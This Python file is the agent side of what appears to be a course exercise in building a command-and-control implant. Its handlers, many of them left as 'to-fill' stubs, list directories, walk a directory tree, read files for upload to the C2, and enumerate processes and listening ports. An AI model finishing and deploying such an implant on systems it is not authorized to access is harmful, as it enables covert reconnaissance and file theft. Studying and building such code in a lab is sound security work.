import os
import subprocess
from protocol.common import *


#  agent command definitions will appear here.


def handle_command(command_id, arguments):
    print(f"[+] Trying to run command handler for command {command_id}")
    if command_id not in command_id_to_command_handler:
        print(f"[-] Command {command_id} is not supported by agent")
        return MESSAGE_STATUS_ERROR, f"[-] {command_id} is not supported by agent"

    payload_handler = command_id_to_command_handler[command_id]
    if arguments:
        return payload_handler(arguments)
    else:
        return payload_handler()


def decode_path(path):
    # listing the path's files and directories (not recursive)
    if isinstance(path, bytes):
        path = path.decode()

    return path


def list_dir(path):
    # listing the path's files and directories (not recursive)

    # todo: #to-fill
    # remember to check the path received. what happens if file path is malformed or it doesn't exist anymore ?
    # check how messages are returned in other handlers. both if response is OK or if there's an error !

    path = decode_path(path)


    response = f"* ListDir path: '{path}' *\n\n"
    # todo: #to-fill

    response += "\n*ListDir End*\n"
    return MESSAGE_STATUS_OK, response


def walk_dir(path):
    # listing the path's files and directories (recursive)
    path = decode_path(path)
    if not os.path.isdir(path):
        return MESSAGE_STATUS_ERROR, f"WalkDir error from agent: path '{path}' doesn't exist locally"

    response = f"* WalkDir path: '{path}' *\n\n"
    # Walk through the directory and its subdirectories
    for dirpath, dirnames, filenames in os.walk(path):
        depth = dirpath.replace(path, "").count(os.sep)
        indent = "\t" * depth  # Indentation based on depth
        #  current directory
        response += f"{indent}[D] {os.path.basename(dirpath) or '.'}\n"
        for dirname in dirnames:
            response += f"{indent}\t[D] {dirname}\n"
        for filename in filenames:
            response += f"{indent}\t[F] {filename}\n"

    response += "\n*WalkDir End*\n"
    return MESSAGE_STATUS_OK, response


def read_file(path):
    response = ""
    # todo: #to-fill
    # remember to check the path received. what happens if file path is malformed or it doesn't exist anymore ?
    # check how messages are returned in other handlers. both if response is OK or if there's an error !

    return MESSAGE_STATUS_OK, response


def list_running_processes():
    # Define column widths
    pid_w = 10
    name_w = 45
    status_w = 10
    memory_w = 12
    cpu_w = 8
    error_w = 15

    response = f"* Running Processes: *\n\n"
    response += f"{'PID':<{pid_w}} {'Name':<{name_w}} {'Status':<{status_w}} {'Memory (MB)':<{memory_w}} {'CPU (%)':<{cpu_w}} {'Error':<{error_w}}\n"
    response += f"{'-' * 90}\n"

    # todo: #to-fill

    response += "\n*Running Processes End*\n"
    return MESSAGE_STATUS_OK, response


def list_listening_tcp_ports():
    # Will list listening TCP ports and their processes
    response = f"* Listening TCP ports: *\n\n"
    # todo: #to-fill

    response += "\n*Listening TCP ports End*\n"

    return MESSAGE_STATUS_OK, response


# functions to handle the command request from C2
# receive arguments
# returns command_status, command_response
command_id_to_command_handler = {
    LISTDIR_COMMAND_ID: list_dir,
    WALKDIR_COMMAND_ID: walk_dir,
    RUNNING_PROCESSES_COMMAND_ID: list_running_processes,
    FILE_UPLOAD_COMMAND_ID: read_file,
    NETWORK_CONNECTIONS_COMMAND_ID: list_listening_tcp_ports,
}

